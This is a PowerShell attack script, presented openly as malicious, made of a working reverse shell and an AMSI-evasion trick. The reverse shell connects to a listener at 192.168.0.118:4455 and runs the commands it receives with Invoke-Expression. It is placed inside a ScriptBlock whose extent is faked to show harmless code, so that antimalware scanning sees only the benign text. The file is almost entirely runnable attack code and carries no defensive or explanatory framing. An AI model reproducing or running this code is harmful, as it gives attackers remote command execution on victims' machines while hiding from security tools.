# Define the malicious script to execute in the EndBlock
$maliciousScript = {
    $LHOST = "192.168.0.118"; 
    $LPORT = 4455; 
    $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
    $NetworkStream = $TCPClient.GetStream(); 
    $StreamReader = New-Object IO.StreamReader($NetworkStream); 
    $StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
    $StreamWriter.AutoFlush = $true; 
    $Buffer = New-Object System.Byte[] 1024; 
    
    while ($TCPClient.Connected) { 
        while ($NetworkStream.DataAvailable) { 
            $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
            $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
        }; 
        
        if ($TCPClient.Connected -and $Code.Length -gt 1) { 
            $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; 
            $StreamWriter.Write("$Output`n"); 
            $Code = $null 
        }; 
    } 
    
    $TCPClient.Close(); 
    $NetworkStream.Close(); 
    $StreamReader.Close(); 
    $StreamWriter.Close()
}

# Create a benign ScriptBlock for the Extent
$benignScript = {
    Write-Host "This is benign code"
}

# Manually create a ScriptBlock with manipulated Extent and EndBlock
$smuggledScriptBlock = [ScriptBlock]::Create($benignScript.ToString())
$smuggledScriptBlock.PSCommand.Extent = [System.Management.Automation.Language.ScriptExtent]::new($benignScript.ToString(), 0, 0, 0, 0)
$smuggledScriptBlock.PSCommand.EndBlock = $maliciousScript

# Execute the ScriptBlock (this should bypass AMSI)
$smuggledScriptBlock.Invoke()
